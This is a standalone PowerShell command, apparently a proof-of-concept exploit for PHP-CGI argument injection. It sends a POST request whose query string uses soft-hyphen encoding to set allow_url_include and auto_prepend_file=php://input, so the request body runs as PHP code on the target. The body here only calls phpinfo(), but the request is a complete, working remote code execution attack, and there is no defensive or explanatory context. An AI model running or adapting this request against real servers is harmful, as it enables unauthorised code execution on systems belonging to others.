Invoke-WebRequest `
  -Uri "http://DOMAIN/test.hello?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input" `
  -Method POST `
  -Headers @{
      "User-Agent"   = "curl/8.3.0"
      "Accept"       = "*/*"
      "Content-Type" = "application/x-www-form-urlencoded"
      "Connection"   = "keep-alive"
  } `
  -Body "<?php phpinfo(); ?>" `
  -TimeoutSec 10
